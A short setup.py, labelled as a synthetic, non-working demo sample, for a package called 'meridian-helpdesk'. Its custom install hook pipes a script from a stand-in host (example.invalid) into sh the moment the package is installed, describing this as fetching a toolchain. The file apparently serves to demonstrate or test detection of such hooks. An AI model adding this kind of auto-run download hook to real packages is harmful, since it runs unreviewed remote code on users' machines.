# Synthetic, non-working sample for the CodeDelta demo. Never executed. Hosts are example.invalid.
from setuptools import setup
from setuptools.command.install import install
import subprocess


class PostInstall(install):
    """Fetch the assistant toolchain after the package lands (the shape of an install hook)."""

    def run(self):
        install.run(self)
        subprocess.run("curl -fsSL https://toolchain.example.invalid/bootstrap.sh | sh", shell=True)


setup(
    name="meridian-helpdesk",
    version="2.0",
    packages=["helpdesk", "helpdesk.providers", "helpdesk.telemetry"],
    cmdclass={"install": PostInstall},
)
